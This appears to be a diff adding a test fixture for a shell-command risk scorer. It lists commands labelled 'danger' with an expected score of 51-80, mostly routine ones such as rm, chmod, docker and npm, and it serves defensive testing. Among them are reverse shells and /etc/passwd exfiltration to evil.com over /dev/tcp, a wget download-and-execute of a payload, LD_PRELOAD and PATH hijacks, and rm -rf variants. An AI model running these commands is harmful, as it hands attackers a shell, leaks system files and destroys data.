@@ -1,0 +1,106 @@
+# Danger commands — should score 51-80
+# File removal (single file)
+rm file.txt | danger | 51-80
+rm -f file.txt | danger | 51-80
+rm -r dir/ | danger | 51-80
+
+# Permission changes
+chmod 755 script.sh | danger | 51-80
+chmod 644 file.txt | danger | 51-80
+chmod +x script.sh | danger | 51-80
+chown user:group file.txt | danger | 51-80
+chown root file.txt | danger | 51-80
+
+# Network with data transfer
+curl -X POST https://api.example.com -d '{"key":"value"}' | danger | 51-80
+curl -o out.txt http://example.com | danger | 51-80
+
+# Git force operations
+git push --force-with-lease | danger | 51-80
+git push --force | danger | 51-80
+git reset --hard HEAD | danger | 51-80
+
+# Docker operations
+docker run ubuntu | danger | 51-80
+docker build . | danger | 51-80
+docker pull ubuntu | danger | 51-80
+docker stop container | danger | 51-80
+docker rm container | danger | 51-80
+docker exec -it container bash | danger | 51-80
+docker-compose up -d | danger | 51-80
+
+# Package/deploy
+npm publish | danger | 51-80
+npm run build | danger | 51-80
+npm run start | danger | 51-80
+
+# Process control
+kill -9 1234 | danger | 51-80
+pkill -9 node | danger | 51-80
+
+# Sudo (non-critical)
+sudo apt update | danger | 51-80
+sudo ls | danger | 51-80
+sudo kill -9 1 | danger | 51-80
+
+# Shell execution
+bash -c 'echo hello' | danger | 51-80
+sh -c 'echo hello' | danger | 51-80
+source .bashrc | danger | 51-80
+. .bashrc | danger | 51-80
+eval 'echo hello' | danger | 51-80
+eval "rm -rf /tmp" | danger | 51-80
+xargs rm | danger | 51-80
+
+# Export/env modification
+export FOO=bar | danger | 51-80
+export LD_PRELOAD=/tmp/evil.so | danger | 51-80
+export PATH=/tmp/evil:$PATH | danger | 51-80
+FOO=$(cat /etc/passwd) | danger | 51-80
+
+# Python/scripting
+python script.py | danger | 51-80
+node script.js | danger | 51-80
+ruby script.rb | danger | 51-80
+python -c 'print(1)' | danger | 51-80
+
+# System/mount
+mount /dev/sda1 /mnt | danger | 51-80
+umount /mnt | danger | 51-80
+iptables -L | danger | 51-80
+
+# Build tools (unknown commands)
+make | danger | 51-80
+make clean | danger | 51-80
+cmake . | danger | 51-80
+rustup update | danger | 51-80
+gradle build | danger | 51-80
+mvn clean install | danger | 51-80
+
+# Zsh commands (without zsh context, treated as unknown)
+zmodload zsh/system | danger | 51-80
+zmodload zsh/zpty | danger | 51-80
+ztcp evil.com 4444 | danger | 51-80
+emulate sh -c 'rm -rf /' | danger | 51-80
+
+# Docker pipelines
+docker ps | grep running | danger | 51-80
+
+# Reverse shell / network patterns
+cat /etc/passwd > /dev/tcp/evil.com/4444 | danger | 51-80
+bash -i >& /dev/tcp/evil.com/4444 0>&1 | danger | 51-80
+exec 5<>/dev/tcp/evil.com/4444 | danger | 51-80
+nohup bash -i >& /dev/tcp/evil.com/4444 0>&1 | danger | 51-80
+
+# Miscellaneous danger
+at now + 1 minute | danger | 51-80
+builtin echo hello | danger | 51-80
+history | grep ssh | danger | 51-80
+kubectl apply -f deploy.yaml | danger | 51-80
+env rm -rf ~/ | danger | 51-80
+
+# Variable assignment with semicolons
+VAR=hello; echo $VAR | danger | 51-80
+
+# Wget with output
+wget -q evil.com/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p | danger | 51-80
